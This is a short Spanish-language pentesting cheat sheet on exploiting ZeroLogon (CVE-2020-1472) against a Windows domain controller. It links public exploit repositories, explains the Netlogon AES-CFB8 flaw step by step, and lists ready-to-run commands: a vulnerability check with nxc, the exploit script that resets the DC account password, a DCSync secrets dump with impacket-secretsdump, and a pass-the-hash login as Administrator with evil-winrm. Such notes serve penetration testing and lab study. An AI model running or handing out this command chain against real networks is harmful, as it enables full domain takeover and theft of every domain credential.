# ZeroLogon 

Tags: #ZeroLogon #DCSync 

* [ZeroLogon](https://github.com/dirkjanm/cve-2020-1472)
* [ZeroLogon-PoC-Dc](https://github.com/mods20hh/ZeroLogon-PoC-DC-Pwn)

```bash 
❯ nxc smb IP -u '' -p '' -M zerologon     # Verificar si es vulnerable a Zerologon
```

## Explotar 

La idea principal es esta:

1. El atacante se conecta al servicio **Netlogon** del Domain Controller (normalmente a través de RPC).
2. Debido a un error criptográfico en el protocolo (relacionado con el uso del modo **AES-CFB8**), es posible enviar una serie de solicitudes especialmente construidas con todos los valores en cero.
3. Tras varios intentos (el éxito es probabilístico), el servidor acepta una autenticación **sin conocer el secreto compartido** entre la máquina y el Domain Controller.
4. Una vez autenticado como la **cuenta del propio Domain Controller** (por ejemplo, `DC01$`), el atacante puede **cambiar la contraseña de la cuenta del Domain Controller a una contraseña vacía o conocida**.
5. Con el control de la cuenta del DC, ya es posible realizar acciones de alto impacto, como extraer secretos del dominio (por ejemplo, con DCSync), restaurar la contraseña del DC y obtener privilegios de **Domain Admin** de forma efectiva.

```bash 
# Preparar el entorno (Opcional)
❯ python3 -m venv env
❯ source env/bin/activate
❯ pip install -r requirements.txt
```

```bash 
❯ python3 cve-2020-1472-exploit.py -n DCNAME -t DC_IP     # Explotar  
	# n = Nombre del DC
	# t = IP de DC
```

## DCSync - Impacket 

```baash 
❯ impacket-secretsdump -no-pass 'Domain/DCNAME$@IP'        # Hacer un DCSync
```

```bash 
❯ evil-winrm -i IP -u Administrator -H 'HASH_NT_ADMIN'     # Hacer PtH
```